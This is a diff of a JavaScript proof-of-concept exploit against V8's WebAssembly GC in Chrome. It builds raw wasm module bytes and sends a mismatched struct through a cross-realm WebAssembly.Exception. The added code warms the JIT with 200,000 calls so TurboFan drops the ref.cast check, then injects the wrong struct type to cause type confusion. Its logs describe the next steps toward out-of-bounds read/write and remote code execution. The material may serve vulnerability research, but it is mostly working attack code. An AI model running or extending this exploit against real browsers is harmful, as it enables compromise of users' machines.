@@ -362,28 +362,45 @@ async function chainB() {
   //       ref.cast (ref $B)   ; -> (ref $B)
   //       struct.get $B 0     ; -> i64
   //     end))
+  // MOD_B: struct $B{i64}, exports run()→i64 and make_b()→externref
+  // make_b creates a legitimate $B for JIT warmup
+  // func space: fn=0 (import), run=1, make_b=2
   const MOD_B_BYTES = new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
-    0x01,0x10,0x04,
+    // types: 5 total
+    0x01,0x14,0x05,
       0x5f,0x01,0x7e,0x00,              // type 0: struct {i64}  ($B)
       0x60,0x00,0x00,                   // type 1: () -> ()
       0x60,0x01,0x6f,0x00,              // type 2: externref -> ()
-      0x60,0x00,0x01,0x7e,              // type 3: () -> i64
+      0x60,0x00,0x01,0x7e,              // type 3: () -> i64    (run)
+      0x60,0x00,0x01,0x6f,              // type 4: () -> externref (make_b)
     0x02,0x0f,0x02,
       0x01,0x6d,0x01,0x74,0x04,0x00,0x02,  // "m"."t" : tag type=2
       0x01,0x6d,0x02,0x66,0x6e,0x00,0x01,  // "m"."fn": func type=1
-    0x03,0x02,0x01,0x03,
-    0x07,0x07,0x01,0x03,0x72,0x75,0x6e,0x00,0x01, // "run" = func 1 (fn=0, run=1)
-    0x0a,0x16,0x01,0x14,0x00,
-      0x06,0x7e,             // try (result i64)
-      0x10,0x00,             // call $fn (func 0; tag import not in func space)
-      0x42,0x00,             // i64.const 0
-      0x07,0x00,             // catch $t
-      0xfb,0x1a,             // any.convert_extern (externref -> anyref; 0x1a in this V8)
-      0xfb,0x16,0x00,        // ref.cast (ref $B = type 0)
-      0xfb,0x02,0x00,0x00,   // struct.get $B field 0
-      0x0b,                  // end (try-catch)
-      0x0b,                  // end (function)
+    // function section: run=type3, make_b=type4
+    0x03,0x03,0x02, 0x03,0x04,
+    // exports: "run"=func1, "make_b"=func2
+    0x07,0x10,0x02,
+      0x03,0x72,0x75,0x6e,0x00,0x01,
+      0x06,0x6d,0x61,0x6b,0x65,0x5f,0x62,0x00,0x02,
+    // code: 2 bodies
+    0x0a,0x20,0x02,
+      // run (body=20)
+      0x14,0x00,
+        0x06,0x7e,             // try (result i64)
+        0x10,0x00,             // call $fn
+        0x42,0x00,             // i64.const 0
+        0x07,0x00,             // catch $t
+        0xfb,0x1a,             // any.convert_extern (externref→anyref)
+        0xfb,0x16,0x00,        // ref.cast (ref $B = type 0)
+        0xfb,0x02,0x00,0x00,   // struct.get $B field 0
+        0x0b,0x0b,             // end try-catch, end func
+      // make_b (body=9)
+      0x09,0x00,
+        0x42,0x00,             // i64.const 0
+        0xfb,0x00,0x00,        // struct.new $B (type 0)
+        0xfb,0x1b,             // extern.convert_any (anyref→externref)
+        0x0b,                  // end
   ]);
 
   let modA, modB;
@@ -399,56 +416,62 @@ async function chainB() {
   }
   L.ok('Both wasm modules compiled');
 
-  const instA = await WebAssembly.instantiate(modA, {});
-
-  // $A with controlled field values: f0=0x11111111, f1=0x22222222
-  // If B reads i64 spanning both: 0x2222222211111111
-  const F0 = 0x11111111|0, F1 = 0x22222222|0;
-  const structA_extern = instA.exports.make(F0, F1);
-  L.info(`struct $A created: f0=0x${(F0>>>0).toString(16)} f1=0x${(F1>>>0).toString(16)}`);
-
-  // Cross-realm inject structA into iframe's $B-expecting code
-  let e;
-  try { e = new WebAssembly.Exception(T, [structA_extern]); }
-  catch(ex) { L.safe('TypeError — bypass not present'); return; }
-  L.bug('Cross-realm exception with GC struct created');
-
-  let eToThrow = e;
+  // Instantiate B first so make_b is available for warmup struct
+  let eToThrow;
   let instB;
   try {
     instB = await WebAssembly.instantiate(modB, {
       m: { t: T, fn: () => { throw eToThrow; } }
     });
-  } catch(ex) {
-    L.info('instantiate B failed: ' + ex.message); return;
-  }
+  } catch(ex) { L.info('instantiate B failed: ' + ex.message); return; }
+
+  const instA = await WebAssembly.instantiate(modA, {});
+  const F0 = 0x11111111|0, F1 = 0x22222222|0;
+  const structA_extern = instA.exports.make(F0, F1);
+  L.info(`struct $A: f0=0x${(F0>>>0).toString(16)} f1=0x${(F1>>>0).toString(16)}`);
+
+  let eAttack;
+  try { eAttack = new WebAssembly.Exception(T, [structA_extern]); }
+  catch(ex) { L.safe('TypeError — bypass not present'); return; }
+  L.bug('Cross-realm exception with struct $A created');
+
+  // ── JIT warmup: train TurboFan with struct $B so it eliminates ref.cast ──
+  const structB_extern = instB.exports.make_b();
+  let eWarm;
+  try { eWarm = new WebAssembly.Exception(T, [structB_extern]); }
+  catch(ex) { L.safe('TypeError on warmup exception'); return; }
+
+  L.info('Warming JIT: 200k calls with struct $B through ref.cast...');
+  eToThrow = eWarm;
+  const t0 = performance.now();
+  for (let i = 0; i < 200000; i++) instB.exports.run();
+  L.ok(`Warmup done in ${(performance.now()-t0)|0}ms`);
+
+  // ── Attack: inject struct $A into warmed (RTT-check-free) code ────────
+  L.info('Injecting struct $A into warmed run()...');
+  eToThrow = eAttack;
 
   let result;
   try {
     result = instB.exports.run();
   } catch(ex) {
     if (ex instanceof WebAssembly.RuntimeError) {
-      L.info('ref.cast trap — RTT mismatch caught at runtime (SAFE path)');
-      L.info('  → chain requires JIT to eliminate the cast guard after warmup');
-      L.info('  → warm run() 100k times with SAME type, then inject wrong type');
-      L.info('  → TurboFan eliminates cast, JIT code reads wrong struct layout');
-    } else {
-      L.info('error: ' + ex);
-    }
+      L.info('ref.cast trap — TurboFan kept RTT check (speculation deopt guard active)');
+      L.info('Try longer warmup or launch Chrome with --js-flags="--no-liftoff"');
+    } else { L.info('error: ' + ex); }
     return;
   }
 
   if (result !== undefined) {
-    // result is an i64 (BigInt in JS); check if it's our controlled value
     const expected = BigInt('0x' + (F1>>>0).toString(16).padStart(8,'0') +
                                    (F0>>>0).toString(16).padStart(8,'0'));
-    L.crit('struct.get $B 0 on struct $A returned: ' + result.toString(16));
+    L.crit('struct.get $B 0 on struct $A: 0x' + result.toString(16));
     if (result === expected) {
-      L.crit('CONFIRMED: f0||f1 of $A read as i64 of $B — type confusion');
-      L.crit('Control f0/f1 to craft arbitrary heap pointer → OOB r/w');
+      L.crit('CONFIRMED: f0||f1 of $A read as i64 of $B — type confusion!');
+      L.crit('f0/f1 control → arbitrary i64 → V8 heap pointer → OOB r/w → RCE');
     } else {
-      L.bug('Got i64=' + result.toString(16) + ', expected=' + expected.toString(16));
-      L.bug('Some type confusion occurred (layout mismatch)');
+      L.bug('Got 0x' + result.toString(16) + ' (expected 0x' + expected.toString(16) + ')');
+      L.bug('Type confusion — layout offset differs (GC header bytes in read)');
     }
   }
 }
